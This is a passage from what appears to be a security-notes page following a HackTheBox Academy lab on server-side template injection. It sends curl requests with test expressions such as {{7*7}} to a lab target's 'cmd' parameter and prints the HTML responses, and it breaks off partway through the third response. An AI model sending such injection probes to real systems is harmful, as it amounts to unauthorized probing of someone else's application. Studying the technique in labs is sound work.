class=md-nav__link for=__nav_2_3_9_1> SSRF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSRF data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_1> <span class="md-nav__icon md-icon"></span> SSRF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ssrf/ class=md-nav__link> SSRF Example </a> </li> <li class=md-nav__item> <a href=../blind_ssrf/ class=md-nav__link> Blind SSRF Example </a> </li> <li class=md-nav__item> <a href=../time_based_ssrf/ class=md-nav__link> Time-Based SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_2 type=checkbox id=__nav_2_3_9_2> <label class=md-nav__link for=__nav_2_3_9_2> SSI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_2> <span class="md-nav__icon md-icon"></span> SSI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ssi_overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../ssi_example/ class=md-nav__link> Example </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_3 type=checkbox id=__nav_2_3_9_3> <label class=md-nav__link for=__nav_2_3_9_3> ESI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ESI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_3> <span class="md-nav__icon md-icon"></span> ESI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../esi_overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_4 type=checkbox id=__nav_2_3_9_4 checked> <label class=md-nav__link for=__nav_2_3_9_4> SSTI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSTI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_4> <span class="md-nav__icon md-icon"></span> SSTI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ssti_intro/ class=md-nav__link> Intro </a> </li> <li class=md-nav__item> <a href=../ssti_example1/ class=md-nav__link> SSTI Example1 </a> </li> <li class=md-nav__item> <a href=../ssti_example2/ class=md-nav__link> SSTI Example2 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> SSTI Example3 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> SSTI Example3 </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#python-primer-for-ssti class=md-nav__link> Python Primer for SSTI </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10 type=checkbox id=__nav_2_3_10> <label class=md-nav__link for=__nav_2_3_10> File Inclusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Inclusion" data-md-level=3> <label class=md-nav__title for=__nav_2_3_10> <span class="md-nav__icon md-icon"></span> File Inclusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/intro/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_2 type=checkbox id=__nav_2_3_10_2> <label class=md-nav__link for=__nav_2_3_10_2> LFI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=LFI data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_2> <span class="md-nav__icon md-icon"></span> LFI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/lfi/ class=md-nav__link> LFI </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/lfi_to_rce/ class=md-nav__link> LFI to RCE </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_3 type=checkbox id=__nav_2_3_10_3> <label class=md-nav__link for=__nav_2_3_10_3> Other Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Other Techniques" data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_3> <span class="md-nav__icon md-icon"></span> Other Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/other_php_wrappers/ class=md-nav__link> PHP Wrappers </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/remote_file_inclusion/ class=md-nav__link> RFI </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../file_inclusion/hardening_tips/ class=md-nav__link> Hardening Tips </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_11 type=checkbox id=__nav_2_3_11> <label class=md-nav__link for=__nav_2_3_11> Shells&Payloads <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Shells&amp;Payloads data-md-level=3> <label class=md-nav__title for=__nav_2_3_11> <span class="md-nav__icon md-icon"></span> Shells&Payloads </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../shells_payloads/msfvenom/ class=md-nav__link> MSFvenom </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/windows_shells/ class=md-nav__link> Windows Shells </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/unix_linux/ class=md-nav__link> NIX Shells </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_12 type=checkbox id=__nav_2_3_12> <label class=md-nav__link for=__nav_2_3_12> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_2_3_12> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/nmap/ class=md-nav__link> Nmap </a> </li> <li class=md-nav__item> <a href=../../tools/ffuf/ class=md-nav__link> Ffuf </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4> Blue Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_analysis/useful_links/ class=md-nav__link> File Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2 type=checkbox id=__nav_2_4_2> <label class=md-nav__link for=__nav_2_4_2> Network Traffic Analysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_2_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/layers/ class=md-nav__link> Layers </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/analysis/ class=md-nav__link> Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_3 type=checkbox id=__nav_2_4_2_3> <label class=md-nav__link for=__nav_2_4_2_3> Tcpdump <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> Packet Filtering </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_4 type=checkbox id=__nav_2_4_2_4> <label class=md-nav__link for=__nav_2_4_2_4> Wireshark <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> Advanced Usage </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5> Resources <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Resources data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Resources </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../useful_resources/links/ class=md-nav__link> Useful Links </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__link--index "> <a href=../../blog/ >Blog</a> <label for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 2022 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2022 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blog/2022/lets_connect/ class=md-nav__link> Lets Connect </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#python-primer-for-ssti class=md-nav__link> Python Primer for SSTI </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>SSTI Example3</h1> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/145/img/jinja1.png></p> <p>User input is submitted via the <code>cmd</code> parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, starting with <code>{7*7}</code>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={7*7}&quot;</span>
<a id=__codelineno-0-2 name=__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3></a><span class=go>&lt;!DOCTYPE html&gt;</span>
<a id=__codelineno-0-4 name=__codelineno-0-4></a><span class=go>&lt;html lang=&quot;en&quot;&gt;</span>
<a id=__codelineno-0-5 name=__codelineno-0-5></a><span class=go>&lt;style type=&quot;text/css&quot;&gt;</span>
<a id=__codelineno-0-6 name=__codelineno-0-6></a><span class=gp>    #</span><span class=nb>command</span> <span class=o>{</span>
<a id=__codelineno-0-7 name=__codelineno-0-7></a><span class=go>        resize: horizontal;</span>
<a id=__codelineno-0-8 name=__codelineno-0-8></a><span class=go>        background-color : transparent;</span>
<a id=__codelineno-0-9 name=__codelineno-0-9></a><span class=go>        border-color: transparent;</span>
<a id=__codelineno-0-10 name=__codelineno-0-10></a><span class=go>        font-size: 15px;</span>
<a id=__codelineno-0-11 name=__codelineno-0-11></a><span class=go>        width: 200px;</span>
<a id=__codelineno-0-12 name=__codelineno-0-12></a>
<a id=__codelineno-0-13 name=__codelineno-0-13></a><span class=go>    }</span>
<a id=__codelineno-0-14 name=__codelineno-0-14></a><span class=gp>    #</span>command:active <span class=o>{</span>
<a id=__codelineno-0-15 name=__codelineno-0-15></a><span class=go>        width: auto;   </span>
<a id=__codelineno-0-16 name=__codelineno-0-16></a><span class=go>    }</span>
<a id=__codelineno-0-17 name=__codelineno-0-17></a><span class=go>&lt;/style&gt;</span>
<a id=__codelineno-0-18 name=__codelineno-0-18></a><span class=go>&lt;head&gt;</span>
<a id=__codelineno-0-19 name=__codelineno-0-19></a><span class=go>    &lt;meta charset=&quot;utf-8&quot;&gt;</span>
<a id=__codelineno-0-20 name=__codelineno-0-20></a><span class=go>    &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<a id=__codelineno-0-21 name=__codelineno-0-21></a><span class=go>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span>
<a id=__codelineno-0-22 name=__codelineno-0-22></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/jquery-ui.css&quot;&gt;</span>
<a id=__codelineno-0-23 name=__codelineno-0-23></a><span class=go>    &lt;script src=&quot;/static/js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-0-24 name=__codelineno-0-24></a><span class=go>    &lt;script src=&quot;/static/js/jquery-ui.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-0-25 name=__codelineno-0-25></a><span class=go>    &lt;script src=&quot;/static/js/script.js&quot;&gt;&lt;/script&gt;    </span>
<a id=__codelineno-0-26 name=__codelineno-0-26></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/style.css&quot; /&gt;</span>
<a id=__codelineno-0-27 name=__codelineno-0-27></a><span class=go>    &lt;title&gt;Windows&lt;/title&gt;</span>
<a id=__codelineno-0-28 name=__codelineno-0-28></a><span class=go>&lt;/head&gt;</span>
<a id=__codelineno-0-29 name=__codelineno-0-29></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-0-30 name=__codelineno-0-30></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-0-31 name=__codelineno-0-31></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-0-32 name=__codelineno-0-32></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-0-33 name=__codelineno-0-33></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-0-34 name=__codelineno-0-34></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-0-35 name=__codelineno-0-35></a><span class=go>                &lt;a&gt;{7*7}&lt;/a&gt;</span>
<a id=__codelineno-0-36 name=__codelineno-0-36></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-0-37 name=__codelineno-0-37></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-0-38 name=__codelineno-0-38></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-0-39 name=__codelineno-0-39></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-0-40 name=__codelineno-0-40></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Windows&quot;&gt;</span>
<a id=__codelineno-0-41 name=__codelineno-0-41></a><span class=go>            &lt;h1&gt;Windows&lt;/h1&gt;</span>
<a id=__codelineno-0-42 name=__codelineno-0-42></a><span class=go>            &lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span>
<a id=__codelineno-0-43 name=__codelineno-0-43></a><span class=go>            &lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span>
<a id=__codelineno-0-44 name=__codelineno-0-44></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-0-45 name=__codelineno-0-45></a>
<a id=__codelineno-0-46 name=__codelineno-0-46></a><span class=go>        &lt;div id=&quot;taskbar&quot;&gt;      </span>
<a id=__codelineno-0-47 name=__codelineno-0-47></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-0-48 name=__codelineno-0-48></a>
<a id=__codelineno-0-49 name=__codelineno-0-49></a><span class=go>        &lt;div id=&quot;icons&quot;&gt;</span>
<a id=__codelineno-0-50 name=__codelineno-0-50></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;0&quot;&gt;Run&lt;/a&gt;</span>
<a id=__codelineno-0-51 name=__codelineno-0-51></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;1&quot;&gt;Welcome&lt;/a&gt;</span>
<a id=__codelineno-0-52 name=__codelineno-0-52></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-0-53 name=__codelineno-0-53></a><span class=go>        &lt;font size=&quot;5px&quot;&gt;&lt;a href=&quot;https://html5-templates.com/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; id=&quot;templateLink&quot;&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span>
<a id=__codelineno-0-54 name=__codelineno-0-54></a><span class=go>        &lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
<a id=__codelineno-0-55 name=__codelineno-0-55></a><span class=go>    &lt;/div&gt;</span>
<a id=__codelineno-0-56 name=__codelineno-0-56></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, <code>${7*7}</code> this time.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s1>&#39;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=${7*7}&#39;</span>
<a id=__codelineno-1-2 name=__codelineno-1-2></a>
<a id=__codelineno-1-3 name=__codelineno-1-3></a><span class=go>&lt;!DOCTYPE html&gt;</span>
<a id=__codelineno-1-4 name=__codelineno-1-4></a><span class=go>&lt;html lang=&quot;en&quot;&gt;</span>
<a id=__codelineno-1-5 name=__codelineno-1-5></a><span class=go>&lt;style type=&quot;text/css&quot;&gt;</span>
<a id=__codelineno-1-6 name=__codelineno-1-6></a><span class=gp>    #</span><span class=nb>command</span> <span class=o>{</span>
<a id=__codelineno-1-7 name=__codelineno-1-7></a><span class=go>        resize: horizontal;</span>
<a id=__codelineno-1-8 name=__codelineno-1-8></a><span class=go>        background-color : transparent;</span>
<a id=__codelineno-1-9 name=__codelineno-1-9></a><span class=go>        border-color: transparent;</span>
<a id=__codelineno-1-10 name=__codelineno-1-10></a><span class=go>        font-size: 15px;</span>
<a id=__codelineno-1-11 name=__codelineno-1-11></a><span class=go>        width: 200px;</span>
<a id=__codelineno-1-12 name=__codelineno-1-12></a>
<a id=__codelineno-1-13 name=__codelineno-1-13></a><span class=go>    }</span>
<a id=__codelineno-1-14 name=__codelineno-1-14></a><span class=gp>    #</span>command:active <span class=o>{</span>
<a id=__codelineno-1-15 name=__codelineno-1-15></a><span class=go>        width: auto;   </span>
<a id=__codelineno-1-16 name=__codelineno-1-16></a><span class=go>    }</span>
<a id=__codelineno-1-17 name=__codelineno-1-17></a><span class=go>&lt;/style&gt;</span>
<a id=__codelineno-1-18 name=__codelineno-1-18></a><span class=go>&lt;head&gt;</span>
<a id=__codelineno-1-19 name=__codelineno-1-19></a><span class=go>    &lt;meta charset=&quot;utf-8&quot;&gt;</span>
<a id=__codelineno-1-20 name=__codelineno-1-20></a><span class=go>    &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<a id=__codelineno-1-21 name=__codelineno-1-21></a><span class=go>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span>
<a id=__codelineno-1-22 name=__codelineno-1-22></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/jquery-ui.css&quot;&gt;</span>
<a id=__codelineno-1-23 name=__codelineno-1-23></a><span class=go>    &lt;script src=&quot;/static/js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-1-24 name=__codelineno-1-24></a><span class=go>    &lt;script src=&quot;/static/js/jquery-ui.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-1-25 name=__codelineno-1-25></a><span class=go>    &lt;script src=&quot;/static/js/script.js&quot;&gt;&lt;/script&gt;    </span>
<a id=__codelineno-1-26 name=__codelineno-1-26></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/style.css&quot; /&gt;</span>
<a id=__codelineno-1-27 name=__codelineno-1-27></a><span class=go>    &lt;title&gt;Windows&lt;/title&gt;</span>
<a id=__codelineno-1-28 name=__codelineno-1-28></a><span class=go>&lt;/head&gt;</span>
<a id=__codelineno-1-29 name=__codelineno-1-29></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-1-30 name=__codelineno-1-30></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-1-31 name=__codelineno-1-31></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-1-32 name=__codelineno-1-32></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-1-33 name=__codelineno-1-33></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-1-34 name=__codelineno-1-34></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-1-35 name=__codelineno-1-35></a><span class=go>                &lt;a&gt;${7*7}&lt;/a&gt;</span>
<a id=__codelineno-1-36 name=__codelineno-1-36></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-1-37 name=__codelineno-1-37></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-1-38 name=__codelineno-1-38></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-1-39 name=__codelineno-1-39></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-1-40 name=__codelineno-1-40></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Windows&quot;&gt;</span>
<a id=__codelineno-1-41 name=__codelineno-1-41></a><span class=go>            &lt;h1&gt;Windows&lt;/h1&gt;</span>
<a id=__codelineno-1-42 name=__codelineno-1-42></a><span class=go>            &lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span>
<a id=__codelineno-1-43 name=__codelineno-1-43></a><span class=go>            &lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span>
<a id=__codelineno-1-44 name=__codelineno-1-44></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-1-45 name=__codelineno-1-45></a>
<a id=__codelineno-1-46 name=__codelineno-1-46></a><span class=go>        &lt;div id=&quot;taskbar&quot;&gt;      </span>
<a id=__codelineno-1-47 name=__codelineno-1-47></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-1-48 name=__codelineno-1-48></a>
<a id=__codelineno-1-49 name=__codelineno-1-49></a><span class=go>        &lt;div id=&quot;icons&quot;&gt;</span>
<a id=__codelineno-1-50 name=__codelineno-1-50></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;0&quot;&gt;Run&lt;/a&gt;</span>
<a id=__codelineno-1-51 name=__codelineno-1-51></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;1&quot;&gt;Welcome&lt;/a&gt;</span>
<a id=__codelineno-1-52 name=__codelineno-1-52></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-1-53 name=__codelineno-1-53></a><span class=go>        &lt;font size=&quot;5px&quot;&gt;&lt;a href=&quot;https://html5-templates.com/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; id=&quot;templateLink&quot;&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span>
<a id=__codelineno-1-54 name=__codelineno-1-54></a><span class=go>        &lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
<a id=__codelineno-1-55 name=__codelineno-1-55></a><span class=go>    &lt;/div&gt;</span>
<a id=__codelineno-1-56 name=__codelineno-1-56></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>It doesn't look like the application evaluated this expression either. What about <code>{{7*7}}</code>?</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*7}}&quot;</span>
<a id=__codelineno-2-2 name=__codelineno-2-2></a>
<a id=__codelineno-2-3 name=__codelineno-2-3></a><span class=go>&lt;!DOCTYPE html&gt;</span>
<a id=__codelineno-2-4 name=__codelineno-2-4></a><span class=go>&lt;html lang=&quot;en&quot;&gt;</span>
<a id=__codelineno-2-5 name=__codelineno-2-5></a><span class=go>&lt;style type=&quot;text/css&quot;&gt;</span>
<a id=__codelineno-2-6 name=__codelineno-2-6></a><span class=gp>    #</span><span class=nb>command</span> <span class=o>{</span>
<a id=__codelineno-2-7 name=__codelineno-2-7></a><span class=go>        resize: horizontal;</span>
<a id=__codelineno-2-8 name=__codelineno-2-8></a><span class=go>        background-color : transparent;</span>
<a id=__codelineno-2-9 name=__codelineno-2-9></a><span class=go>        border-color: transparent;</span>
<a id=__codelineno-2-10 name=__codelineno-2-10></a><span class=go>        font-size: 15px;</span>
<a id=__codelineno-2-11 name=__codelineno-2-11></a><span class=go>        width: 200px;</span>
<a id=__codelineno-2-12 name=__codelineno-2-12></a>
<a id=__codelineno-2-13 name=__codelineno-2-13></a><span class=go>    }</span>
<a id=__codelineno-2-14 name=__codelineno-2-14></a><span class=gp>    #</span>command:active <span class=o>{</span>
<a id=__codelineno-2-15 name=__codelineno-2-15></a><span class=go>        width: auto;   </span>
<a id=__codelineno-2-16 name=__codelineno-2-16></a><span class=go>    }</span>
<a id=__codelineno-2-17 name=__codelineno-2-17></a><span class=go>&lt;/style&gt;</span>
<a id=__codelineno-2-18 name=__codelineno-2-18></a><span class=go>&lt;head&gt;</span>
<a id=__codelineno-2-19 name=__codelineno-2-19></a><span class=go>    &lt;meta charset=&quot;utf-8&quot;&gt;</span>
<a id=__codelineno-2-20 name=__codelineno-2-20></a><span class=go>    &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<a id=__codelineno-2-21 name=__codelineno-2-21></a><span class=go>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span>
<a id=__codelineno-2-22 name=__codelineno-2-22></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/jquery-ui.css&quot;&gt;</span>
<a id=__codelineno-2-23 name=__codelineno-2-23></a><span class=go>    &lt;script src=&quot;/static/js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-2-24 name=__codelineno-2-24></a><span class=go>    &lt;script src=&quot;/static/js/jquery-ui.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-2-25 name=__codelineno-2-25></a><span class=go>    &lt;script src=&quot;/static/js/script.js&quot;&gt;&lt;/script&gt;    </span>
<a id=__codelineno-2-26 name=__codelineno-2-26></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/style.css&quot; /&gt;</span>
<a id=__codelineno-2-27 name=__codelineno-2-27></a><span class=go>    &lt;title&gt;Windows&lt;/title&gt;</span>
<a id=__codelineno-2-28 name=__codelineno-2-28></a><span class=go>&lt;/head&gt;</span>
<a id=__codelineno-2-29 name=__codelineno-2-29></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-2-30 name=__codelineno-2-30></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-2-31 name=__codelineno-2-31></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-2-32 name=__codelineno-2-32></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
